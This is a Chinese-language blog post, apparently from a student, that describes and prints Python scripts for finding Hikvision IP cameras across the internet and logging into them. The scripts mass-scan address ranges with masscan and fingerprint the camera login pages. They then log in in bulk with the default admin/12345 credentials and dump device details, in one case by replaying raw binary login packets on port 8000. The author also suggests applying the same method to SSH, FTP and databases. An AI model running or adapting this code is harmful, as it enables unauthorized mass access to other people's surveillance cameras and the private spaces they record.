---
layout: post
title: "Python Spider: 海康威视摄像头发现"
excerpt: "速写爬虫的一些经历"
category: python
tags: [python, spider]
disqus: true
---


## Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)

> 一切都在不可避免的走向庸俗
> 
> 王小波

挖坟= =and 最后一个爬虫。

缘起在去年，一个去某阿里的我并不认识的毕业师兄，这个毕业的师兄好像还写了北邮人ip到地址插件，这个师兄在毕业的时候发了一些列摆一摆贵邮的各种安全问题，其中有个摄像头默认用户名密码。结果呢，我就没登录进去那几个摄像头= =

警告：你所做的一切都是有迹可寻的，dont be evil。

我这里只举摄像头的例子。其实能做的很多，ssh服务器，ftp、数据库等等。如果对web安全漏洞比较熟悉，拿到互联网上批量挖掘都行。。。好像不是在讲爬虫了，不过我觉得爬虫就是爬取信息的工具。

顺便一提，最近分析了下阿里的社会招聘，顺便画了下据此得到的阿里架构图，有兴趣的同学可以一起玩.

大概这么几步：
1. 用高效的扫描器扫描大范围地址段，得到开放端口80的ip列表，最好还是随机而不是顺序排列的
2. 对地址大海中聊若晨星般的ip进行http请求，获取服务器信息，保存下来。
3. 找到某种摄像头信息的“基因”(即，这种摄像头必然返回这种信息而其它服务器不会),这里只举一个简单例子
4. 批量获取弱密码摄像头

首先，我们需要在unix下工作。。。我们需要辅助工具。我这里说下为什么会使用[masscan](https://github.com/robertdavidgraham/masscan)，因为他比我自己写的扫描器比[zmap](https://zmap.io)、nmap更快，快很多，虽然它们各有所长。python这里又做起了胶水语言的勾当= =

```python
#! /usr/bin python
# -*- coding: utf-8 -*-

"""
扫描指定端口
usage:
    python scan_port.py net interface port
"""

import sys
import popen2
import os
try:
    os.makedirs('data/open_port/')
except:
    pass
try:
    os.mkdir('dump')
except:
    pass
# 扫描网段内80端口, 生成列表
cmd = "sudo masscan -i" + sys.argv[2] + \
    " -p " + sys.argv[3] + " --rate 100000 --wait 2 -oL data/open_port/open" + \
    sys.argv[3] + "_ip.temp " + \
    sys.argv[1] + " &&\
    cut -f4 -d' ' data/open_port/open" + sys.argv[3] + \
    "_ip.temp > data/open_port/open" + sys.argv[3] + "_ip.list &&\
    rm -f data/open_port/open" + sys.argv[3] + "_ip.temp"
print cmd
# cmd = "sudo zmap -i " + sys.argv[2]  + \
#    " -p " + sys.argv[3] + " -o open" + sys.argv[3] + \
#    "_ip.list " + sys.argv[1]

(child_stdout, child_stdin) = popen2.popen2(cmd, bufsize=-1, mode='t')
# 打印输出
sys.stdout.write(child_stdout.read())
```

是不是看上去特别奇葩，我把这种奇(zuo)葩(si)的行事方式叫做quick and dirty式，除了确实能用没有其它优点了(ゝ∀･)

速度很快，这已经到我无线上行的顶峰了，旁边打游戏的同学不要打我ლ(╹◡╹ლ)。喝杯水，看会有爱的[eloquent javascript](http://eloquentjavascript.net/09_regexp.html)，设定下终端静默时提醒，嗯，好像终端提醒这种神器只有[yakuake](https://yakuake.kde.org)会有~^_^~

![](/images/spider/net_scan_1.png)

我们接下来要处理下这些开放80端口的ip，我们把开放80端口的服务器都模拟请求一次，这样就获得每个ip对应的服务器信息。[其实这一步我们可以改masscan源码，这样上一步扫描的时候就能把服务器返回信息返回，我们愉快的解析成想要的格式就行](https://github.com/robertdavidgraham/masscan/search?utf8=%E2%9C%93&q=HTTP%2FGET+)

```python
#! /usr/bin python
# -*- coding: utf-8 -*-

"""
获取server dict
"""

import socket
from gevent import monkey
monkey.patch_all()

# 设置默认timeout时间
timeout = 20
socket.setdefaulttimeout(timeout)

import requests
import pickle

with open('./data/open_port/open80_ip.list') as f:
    ips = f.readlines()

ips = [ip.strip() for ip in ips]
# 移除开头和结尾的无关信息
try:
    ips.remove('#masscan')
    # ips.remove('# end')
except:
    ips.remove('saddr')
finally:
    ips.remove('')
# 保存80端口响应
server_dict = {}


def check_service(ip):
    s = requests.session()
    print "test", ip
    try:
        r = s.get('http://' + ip,
                  verify=False,
                  allow_redirects=True,
                  timeout=20)
        server_dict[ip] = r
    except:
        pass

from gevent.pool import Pool
pool = Pool(30)
pool.join(timeout=20)
pool.map(check_service, ips)
print '-' * 40
print "Dumping port-80 response..."
with open('./data/dict/server_dict.txt', 'wb') as f:
    pickle.dump(server_dict, f)
```

好吧，monkey_patch,gevent这点非常适合这种quick&dirty的脏活累活，就像我常做的事情。。。


![](/images/spider/net_scan_2.png)

gevent是啥呢？不知道的自己谷歌吧，我也不知道是啥，据说是对libev的封装，据说是协程、据说是yield，据说yield是好像操作系统完成一次任务切换，据说操作系统任务切换在x86下要靠TSS，据说...

总之，你阻塞的每次请求变成了可以并发的请求。这里的坑我不想说，因为我不懂= =，但你可以自己试试不用gevent的版本。

另外，这里会比masscan慢上无数倍，masscan用用户态的网络栈来实现无状态了，我们这里则是用着系统提供的网络栈。

接下来，该看看怎么获取某种摄像头的“基因”并且批量登录了，这之前已经提到过，用浏览器检查整个过程。找到其特点。

![](/images/spider/net_scan_3.png)

我觉得这东西就是其特点了<span>´ ▽ ` )ﾉ</span>

对符合特点的ip地址，我们不妨试着登录下。果然跳转到另一个页面了。分析下如何登录的吧

这种默认用户名密码上网一搜就搜到了= =

![](/images/spider/net_scan_4.png)

![](/images/spider/net_scan_5.png)

同理，我们可以找到设备信息的地址。万事具备，只剩代码

```python
#! /usr/bin python
# -*- coding: utf-8 -*-

"""
获取摄像头信息框架
输入：
- 特征字符串
- 获取信息方法。同步/异步
输出：
编号文件camera_num
id:name:username:password
"""

import socket
from gevent import monkey
monkey.patch_all()

# 设置默认timeout时间
timeout = 100
socket.setdefaulttimeout(timeout)

import requests
import pickle

with open('./data/dict/server_dict.txt') as f:
    server_dict = pickle.load(f)
# Hikvision: 可登录验证
#
# 第一种
print "Hikvision IP Camera found:"
print "Username: admin"
print "Password: 12345"
t_1 = {}
print "-" * 40
for x in server_dict.iteritems():
    if x[1].content.find('doc/page/login.asp') >= 0:
        print x[0]
        t_1[x[0]] = ''


# 抓取第一种设备信息
def device_info(ip):
    s = requests.session()
    s.auth = ('admin', '12345')
    try:
        r = s.get('http://' + ip + '/PSIA/System/deviceInfo')
        if r.ok:
            t_1[ip] = r.content
        else:
            r = s.get('http://' + ip + '/ISAPI/System/deviceInfo')
            if r.ok:
                t_1[ip] = r.content
    except:
        t_1[ip] = ''
        pass

from gevent.pool import Pool
pool = Pool(300)
pool.join(timeout=100)
pool.map(device_info, [ip for ip in t_1.keys()])
print "[*] Dumping type 1 devices info"
with open('./dump/camera/t_1.txt', 'wb') as f:
    pickle.dump(t_1, f)
```

![](/images/spider/net_scan_6.png)

获取的设备信息是xml格式的，我们可以自由的利用python的xml库进行解析，进行数据分析等等。

另外，有很多摄像头要求浏览器安装自己的浏览器activex插件，我们可以用wireshark或类似东西抓下包，找到其相关信息的位置，然后猜测解析协议。比如，另一种摄像头

```python
#! /usr/bin python
# -*- coding: utf-8 -*-

"""
t_2
OCX
"""
# FIXME: 经常失败？
# 目前想法是控制timeout
# 多次请求后成功率变高？

import socket

# 设置默认timeout时间
timeout = 2
socket.setdefaulttimeout(timeout)

import pickle
import struct

with open('./data/dict/server_dict.txt') as f:
    server_dict = pickle.load(f)

# 第二种
print '-' * 40
print "Find IP Camera Type 2"
print "Hikvision IP Camera found:(ObjectX, check disabled)"
print "Username: admin"
print "Password: 12345"
t_2 = {}
for x in server_dict.iteritems():
    if x[1].content.find('NetOCX') >= 0:
        t_2[x[0]] = ''
        print x[0]


# 抓取第二种设备信息
def device_info(ip):
    print "test ", ip
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 8000))
        s.send("\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00(\xc1\x00\x00\x00\x00\x0f\x02\x00\n\x08\x00';Je\x00\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00")
        data = s.recv(1024)
        login_rt = "\x00\x00\x00L'\x00\x00\x00\x00\x00\x00'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        s.close()
        if data != login_rt:
            t_2[ip] = ''
            return
        else:
            # 首先是个seq
            # 可能无效包，但测试必须有后面才正常
            for i in range(3):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 8000))
                seq_req = "\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x00(\xc1\x00\x00\x00\x00\x0f\x02\x00\n\x08\x00';Je\x00\x00z\xdaf\x00\x8d\x16\xd2~\x9dU\x05\xf1\x1fi\xbb\xa9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc3\xd0\xa2|\xa6v\xbd\xf3\x1eO\xd1\xcb\xdc\xae\xcbd"
                s.send(seq_req)
                seq_ret = s.recv(1024)
                del seq_ret
                s.close()
            # 然后是name_seq
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 8000))
            name_seq_req = "\x00\x00\x00 Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00"
            s.send(name_seq_req)
            name_seq_ret = s.recv(1024)
            # print "name_seq_ret: ", name_seq_ret
            s.close()
            # 其次是chanel
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 8000))
            chanel_req = "\x00\x00\x00$Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x022\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00\x00\x00\x00\x01"
            s.send(chanel_req)
            chanel_ret = s.recv(1024)
            # print "Chanle_ret: ", chanel_ret
            # 再来解析mac地址
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 8000))
            mac_req = "\x00\x00\x00 Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x01\x00\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00"
            s.send(mac_req)
            mac_ret = s.recv(1024)
            s.close()
            t_2[ip] = {'chanel': chanel_ret[20:40].strip('\x00').decode('gbk'),
                       'server_name': name_seq_ret[20:40].strip('\x00'),
                       'seqnum': name_seq_ret[60:100].strip('\x00'),
                       'mac': "%02x:%02x:%02x:%02x:%02x:%02x:" % struct.unpack('BBBBBB', mac_ret[36:42])}
    except:
        t_2[ip] = ''
        pass

for ip in t_2.keys():
    device_info(ip)
print "[*] Dumping type 2 devices info"
with open('./dump/camera/t_2.txt', 'wb') as f:
    pickle.dump(t_2, f)

for k, v in t_2.iteritems():
    if v == '':
        print k, ': login failed'
        continue
    print k, ': Ok, info dumped.'
```

根据同样的原理，我们还可以写爬虫搜集整个局域网互联网内其它信息，比如ftp，特别是匿名ftp，sql，代理服务器啊，等等，

大概是知道创宇的zoomeye出来之前，我想在贵邮局域网实现shadon，一个设备杂项搜索引擎，最后，实验室太忙了= =只有个从未公开的ftp搜索web界面

![](/images/spider/net_scan_7.png)

第一次做效率奇低，特别在加上不同的中文编码

![](/images/spider/net_scan_8.png)

第二次好多了，如果以后有空再说吧
